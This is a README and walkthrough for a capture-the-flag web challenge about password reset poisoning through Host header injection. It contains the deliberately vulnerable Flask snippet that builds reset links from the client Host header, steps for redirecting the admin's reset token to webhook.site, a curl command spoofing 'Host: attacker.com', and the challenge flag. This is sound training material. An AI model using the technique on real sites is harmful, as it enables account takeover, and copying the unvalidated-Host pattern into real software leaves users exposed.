# ☠️ Phantom Reset — Host Header Injection CTF

**Category:** Web Application Security  
**Difficulty:** Medium (300 Points)  
**Flag Format:** `DAKSHH{flag}`

> *"The corporate portal looks secure, but the password reset flow hides a deadly flaw. Intercept, poison, and hijack — can you steal the admin's identity before the system locks you out?"*

---

## Challenge Overview

This challenge simulates a classic **Password Reset Poisoning** vulnerability via **Host Header Injection**.

The application allows users to request a password reset link. The backend dynamically generates this link using the HTTP `Host` header provided by the client — **trusting it blindly** without validation. When a reset is requested for the `admin` account, the backend generates the reset link and simulates the admin clicking on it (via a background HTTP GET request).

**The Attack:** If an attacker intercepts the request and changes the `Host` header to a server they control (e.g., `webhook.site`), the backend generates a reset link pointing to the attacker's server. When the admin "clicks" the link, the secret reset token is leaked to the attacker, allowing full account takeover.

### Hints for Players
- **Hint 1:** Have you tried resetting the admin's password? Where does that link go?
- **Hint 2:** If the server generates a link dynamically, how does it know what domain it's hosted on? Check your HTTP request headers.
- **Hint 3:** You need a way to catch incoming web requests. Services like [webhook.site](https://webhook.site/) or RequestBin are your friends.

---

## 🔧 How to Start the Challenge Room (Step-by-Step)

### Prerequisites
- **Python 3.x** installed on your system
- **pip** (Python package manager)
- **Burp Suite** or **OWASP ZAP** (for intercepting/modifying HTTP requests) — recommended for players
- A request-catching service like [webhook.site](https://webhook.site/) — for capturing the stolen token

### Step 1: Install Dependencies
Open a terminal/command prompt and run:
```bash
pip install flask requests
```
This installs:
- `flask` — The web framework that serves the challenge application
- `requests` — Used by the simulated admin bot to "click" the reset link

### Step 2: Navigate to the Challenge Directory
```bash
cd "d:\HITK_CTF\CTF-Dakshh\Web App - CTF - JK\host-header-injection-ctf"
```

### Step 3: Start the Challenge Room
```bash
python app.py
```

**Expected terminal output:**
```
 * Serving Flask app 'app'
 * Debug mode: off
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5008
```

### Step 4: Access the Challenge Room
Open your browser and go to:
```
http://127.0.0.1:5008
```

**What the player sees:**
- A **"Secure Login"** page with username/password fields
- A **"Forgot Password?"** link at the bottom

### Step 5: Stop the Room (When Done)
Press `Ctrl + C` in the terminal to shut down the server.

---

## 📁 File Structure & Roles

| File | Role | Who Sees It? |
|------|------|-------------|
| `app.py` | Flask server — hosts the login page, forgot password flow, and reset logic | Admin only (source code) |
| `solve.py` | Automated solver — demonstrates the Host Header Injection attack | Admin only |
| `requirements.txt` | Python dependencies (`flask`, `requests`) | Admin only |
| `Procfile` | For Heroku/cloud deployment (optional) | Admin only |
| `readme.md` | This file — challenge documentation and writeup | Admin only |

---

## 📌 How the Challenge Application Works (Internals)

### Pages / Routes

| Route | Method | What It Does |
|-------|--------|-------------|
| `/` | GET | Displays the login page |
| `/login` | POST | Checks username & password. If correct (`admin` + correct password) → shows the flag |
| `/forgot_password` | GET | Displays the "Reset Password" form |
| `/forgot_password` | POST | **THE VULNERABLE ENDPOINT** — generates a reset token and builds the reset link using `request.headers.get("Host")` |
| `/reset_password` | GET | Shows the "Set New Password" form (requires valid `?token=` parameter) |
| `/reset_password` | POST | Actually resets the password for the user matching the token |

### The Vulnerability (Line 147 of `app.py`)
```python
host = request.headers.get("Host", "127.0.0.1:5000")
reset_link = f"http://{host}/reset_password?token={token}"
```
The server **trusts the client-supplied `Host` header** without validation, using it directly to build the password reset URL.

### The Admin Bot (Line 101-114 of `app.py`)
When a reset is requested for `admin`, a background thread simulates the admin clicking the reset link:
```python
if username == "admin":
    threading.Thread(target=simulate_admin_click, args=(reset_link,)).start()
```
This thread makes a GET request to whatever URL was generated — if the attacker poisoned the Host header, this GET request goes to the attacker's server, leaking the token.

---

## 🔑 Writeup — How to Solve (Player Walkthrough)

### Step 1: Reconnaissance
1. Open `http://127.0.0.1:5008` in your browser
2. You see a login page — you don't know the admin password
3. Click **"Forgot Password?"** → you see a password reset form

### Step 2: Set Up Your Request Catcher
1. Go to [https://webhook.site](https://webhook.site/) in another browser tab
2. You'll get a unique URL like: `https://webhook.site/abc123-def456-...`
3. Copy the unique ID part (e.g., `abc123-def456-...`)
4. Keep this tab open — this is where the stolen token will appear

### Step 3: Intercept and Modify the Request
1. Open **Burp Suite** (or any HTTP proxy)
2. Set your browser to route through the proxy
3. On the Forgot Password page, enter `admin` as the username
4. **Before submitting**, enable intercept in Burp Suite
5. Click **"Send Reset Link"**
6. Burp Suite captures the POST request to `/forgot_password`

### Step 4: Poison the Host Header
In the intercepted request, find:
```
Host: 127.0.0.1:5008
```
Change it to your webhook URL:
```
Host: webhook.site/abc123-def456-...
```
Then **forward the request**.

### Step 5: Capture the Token
1. Go back to your `webhook.site` tab
2. You should see an incoming **GET request** like:
   ```
   GET /abc123-def456-.../reset_password?token=1a2b3c4d-5e6f-7890-abcd-ef1234567890
   ```
3. **Copy the `token` value** from the URL — this is the admin's password reset token!

### Step 6: Reset the Admin's Password
In your browser (NOT through Burp), navigate to:
```
http://127.0.0.1:5008/reset_password?token=1a2b3c4d-5e6f-7890-abcd-ef1234567890
```
(Replace with the actual token you captured)

You'll see a "Set New Password" form. Enter any password you want (e.g., `hacked123`).

### Step 7: Login as Admin and Get the Flag
1. Go back to `http://127.0.0.1:5008`
2. Login with:
   - **Username:** `admin`
   - **Password:** `hacked123` (your newly set password)
3. 🎉 **Flag is displayed:** `DAKSHH{h0st_h34d3r_p01s0n1ng_f0r_t4h_w1n}`

---

## 🛡️ Admin Verification (Quick Test)

### Using `solve.py`
The solver script demonstrates the vulnerability:
```bash
python solve.py
```
This sends a POST request with a spoofed `Host: attacker.com` header. Check the **server terminal** — you'll see:
```
[System] Generated reset link for admin: http://attacker.com/reset_password?token=XYZ
[Admin Bot] Failed to click link: ...
```
The key observation is the reset link points to `attacker.com` instead of `127.0.0.1:5008` — proving the Host Header Injection works.

> **Note:** `solve.py` can't fully automate the solve because it requires an external listener to capture the token. It's a proof-of-concept demonstrating the vulnerability exists.

### Manual Admin Verification
1. Start the server (`python app.py`)
2. In a separate terminal, use `curl` to trigger the vulnerability:
   ```bash
   curl -X POST http://127.0.0.1:5008/forgot_password -d "username=admin" -H "Host: attacker.com"
   ```
3. Check the server terminal output — you'll see:
   ```
   [System] Generated reset link for admin: http://attacker.com/reset_password?token=<uuid>
   ```
4. Copy the token from the server output
5. Open in browser: `http://127.0.0.1:5008/reset_password?token=<uuid>`
6. Set a new password → Login as admin → Flag appears

---

## ⚠️ Important Notes
- The admin bot simulates a real-world scenario where the victim (admin) clicks the password reset link from their email. In production, this would be an actual email click.
- The `timeout=3` in the admin bot limits SSRF risk from players pointing the Host header at internal IPs.
- Players need an external request-catching service (like `webhook.site`) to capture the token — they CANNOT see the server's terminal output.
- Every reset generates a **new random UUID token**. Tokens are one-time use and get invalidated after a successful password reset.

---

Contributor : Jyotirmoy Karmakar(0xjyotirmoy)
